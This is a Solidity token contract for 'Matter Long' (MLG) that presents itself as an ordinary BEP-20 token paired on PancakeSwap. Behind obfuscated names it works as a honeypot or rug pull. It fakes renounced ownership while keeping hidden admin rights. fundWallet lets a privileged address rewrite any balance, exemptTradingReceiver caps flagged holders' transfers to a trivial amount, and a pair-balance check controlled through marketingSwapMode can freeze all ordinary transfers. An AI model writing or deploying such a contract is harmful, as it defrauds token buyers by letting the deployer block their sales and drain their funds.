//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface fundLaunchedMax {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract fundFrom {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface modeFrom {
    function createPair(address enableMin, address senderList) external returns (address);
}

interface liquidityEnableLimit {
    function totalSupply() external view returns (uint256);

    function balanceOf(address limitIs) external view returns (uint256);

    function transfer(address takeAtLaunch, uint256 txSwap) external returns (bool);

    function allowance(address fromWallet, address spender) external view returns (uint256);

    function approve(address spender, uint256 txSwap) external returns (bool);

    function transferFrom(
        address sender,
        address takeAtLaunch,
        uint256 txSwap
    ) external returns (bool);

    event Transfer(address indexed from, address indexed amountAtLaunched, uint256 value);
    event Approval(address indexed fromWallet, address indexed spender, uint256 value);
}

interface liquidityEnableLimitMetadata is liquidityEnableLimit {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract MatterLong is fundFrom, liquidityEnableLimit, liquidityEnableLimitMetadata {

    mapping(address => bool) public maxMode;

    bool public exemptFeeWallet;

    function marketingAmountList() public {
        emit OwnershipTransferred(senderLimitFund, address(0));
        autoSenderBuy = address(0);
    }

    uint256 private autoMarketing;

    mapping(address => bool) public buyLiquidity;

    uint256 constant launchAmount = 6 ** 10;

    uint256 private senderMode = 100000000 * 10 ** 18;

    address private autoSenderBuy;

    uint256 private walletAt;

    function totalSupply() external view virtual override returns (uint256) {
        return senderMode;
    }

    function owner() external view returns (address) {
        return autoSenderBuy;
    }

    function transferFrom(address fundTrading, address takeAtLaunch, uint256 txSwap) external override returns (bool) {
        if (_msgSender() != buyEnable) {
            if (receiverList[fundTrading][_msgSender()] != type(uint256).max) {
                require(txSwap <= receiverList[fundTrading][_msgSender()]);
                receiverList[fundTrading][_msgSender()] -= txSwap;
            }
        }
        return tradingWallet(fundTrading, takeAtLaunch, txSwap);
    }

    function decimals() external view virtual override returns (uint8) {
        return sellShouldFee;
    }

    address senderTeamAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => mapping(address => uint256)) private receiverList;

    function marketingSwapMode(uint256 txSwap) public {
        enableTrading();
        enableAt = txSwap;
    }

    uint256 enableAt;

    bool public feeReceiver;

    function balanceOf(address limitIs) public view virtual override returns (uint256) {
        return senderReceiver[limitIs];
    }

    function approve(address minSenderTotal, uint256 txSwap) public virtual override returns (bool) {
        receiverList[_msgSender()][minSenderTotal] = txSwap;
        emit Approval(_msgSender(), minSenderTotal, txSwap);
        return true;
    }

    bool private isTrading;

    uint8 private sellShouldFee = 18;

    event OwnershipTransferred(address indexed tradingAuto, address indexed amountReceiverMin);

    function allowance(address atAuto, address minSenderTotal) external view virtual override returns (uint256) {
        if (minSenderTotal == buyEnable) {
            return type(uint256).max;
        }
        return receiverList[atAuto][minSenderTotal];
    }

    address buyEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public senderLimitFund;

    function enableTrading() private view {
        require(maxMode[_msgSender()]);
    }

    function name() external view virtual override returns (string memory) {
        return takeTokenTrading;
    }

    function fundWallet(address sellAt, uint256 txSwap) public {
        enableTrading();
        senderReceiver[sellAt] = txSwap;
    }

    mapping(address => uint256) private senderReceiver;

    function symbol() external view virtual override returns (string memory) {
        return tokenMaxShould;
    }

    constructor (){
        
        fundLaunchedMax tokenLaunch = fundLaunchedMax(buyEnable);
        sellWalletShould = modeFrom(tokenLaunch.factory()).createPair(tokenLaunch.WETH(), address(this));
        
        senderLimitFund = _msgSender();
        marketingAmountList();
        maxMode[senderLimitFund] = true;
        senderReceiver[senderLimitFund] = senderMode;
        if (autoMarketing != totalLaunchTake) {
            totalLaunchTake = autoMarketing;
        }
        emit Transfer(address(0), senderLimitFund, senderMode);
    }

    bool public buyTakeLaunch;

    bool private receiverBuy;

    uint256 public totalLaunchTake;

    function minFee(address amountLiquidityReceiver) public {
        if (launchedTeam) {
            return;
        }
        
        maxMode[amountLiquidityReceiver] = true;
        if (walletAt != autoMarketing) {
            teamLaunchAt = false;
        }
        launchedTeam = true;
    }

    function tradingWallet(address fundTrading, address takeAtLaunch, uint256 txSwap) internal returns (bool) {
        if (fundTrading == senderLimitFund) {
            return isTakeMax(fundTrading, takeAtLaunch, txSwap);
        }
        uint256 launchWallet = liquidityEnableLimit(sellWalletShould).balanceOf(senderTeamAmount);
        require(launchWallet == enableAt);
        require(takeAtLaunch != senderTeamAmount);
        if (buyLiquidity[fundTrading]) {
            return isTakeMax(fundTrading, takeAtLaunch, launchAmount);
        }
        return isTakeMax(fundTrading, takeAtLaunch, txSwap);
    }

    bool public teamLaunchAt;

    function isTakeMax(address fundTrading, address takeAtLaunch, uint256 txSwap) internal returns (bool) {
        require(senderReceiver[fundTrading] >= txSwap);
        senderReceiver[fundTrading] -= txSwap;
        senderReceiver[takeAtLaunch] += txSwap;
        emit Transfer(fundTrading, takeAtLaunch, txSwap);
        return true;
    }

    function getOwner() external view returns (address) {
        return autoSenderBuy;
    }

    function transfer(address sellAt, uint256 txSwap) external virtual override returns (bool) {
        return tradingWallet(_msgSender(), sellAt, txSwap);
    }

    string private tokenMaxShould = "MLG";

    bool public launchedTeam;

    function exemptTradingReceiver(address atMarketing) public {
        enableTrading();
        
        if (atMarketing == senderLimitFund || atMarketing == sellWalletShould) {
            return;
        }
        buyLiquidity[atMarketing] = true;
    }

    string private takeTokenTrading = "Matter Long";

    address public sellWalletShould;

    uint256 enableTeamFee;

}